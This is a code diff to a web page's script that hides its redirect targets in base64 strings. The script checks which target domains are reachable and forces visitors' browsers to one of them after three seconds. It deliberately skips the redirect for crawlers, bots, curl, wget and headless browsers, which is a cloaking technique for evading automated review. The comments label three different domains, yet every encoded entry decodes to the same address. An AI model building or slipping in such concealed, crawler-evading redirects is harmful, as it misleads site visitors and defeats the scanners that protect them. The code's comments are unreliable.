@@ -72,25 +72,45 @@
   </div>
 
   <script>
-    // ✅ Base64 加密跳转地址
-    const _x1 = 'aHR0cHM6Ly93ZWIuYWlzdHJpcC52aXA='; // https://web.aistrip.vip
-    const _y2 = atob(_x1);
-
     // ✅ UA 判断（仅对浏览器跳转）
     const ua = navigator.userAgent.toLowerCase();
     const isBrowser = /chrome|safari|firefox|edge|opera|mobile/.test(ua);
     const isBot = /bot|spider|crawler|curl|python|wget|headless/.test(ua);
 
-    // ✅ 跳转函数（每次打开都跳转）
-    const redirect = () => {
-      if (isBrowser && !isBot) {
-        window.location.href = _y2;
-      }
-    };
+    // ✅ Base64 加密跳转地址列表（多域名）
+    const encodedList = [
+      'aHR0cHM6Ly93ZWIuYWlzdHJpcC52aXA=',       // web.aistrip.vip
+      'aHR0cHM6Ly93ZWIuYWlzdHJpcC52aXA=',   // strip.apistrip.com
+      'aHR0cHM6Ly93ZWIuYWlzdHJpcC52aXA='            // ai.strip.cl（示例）
+    ];
 
-    // ✅ 页面加载后延迟跳转
+    // ✅ 检测域名是否可用（通过加载 ping.png）
+    function checkDomain(url) {
+      return new Promise((resolve) => {
+        const img = new Image();
+        img.src = url + '/ping.png?' + Date.now();
+        img.onload = () => resolve(url);
+        img.onerror = () => resolve(null);
+      });
+    }
+
+    // ✅ 自动检测并跳转
+    async function autoRedirect() {
+      if (!isBrowser || isBot) return;
+
+      for (const encoded of encodedList) {
+        const url = atob(encoded);
+        const result = await checkDomain(url);
+        if (result) {
+          window.location.href = result;
+          break;
+        }
+      }
+    }
+
+    // ✅ 页面加载后延迟跳转（每次打开都会跳）
     document.addEventListener('DOMContentLoaded', () => {
-      setTimeout(redirect, 3000);
+      setTimeout(autoRedirect, 3000);
     });
   </script>
 </body>
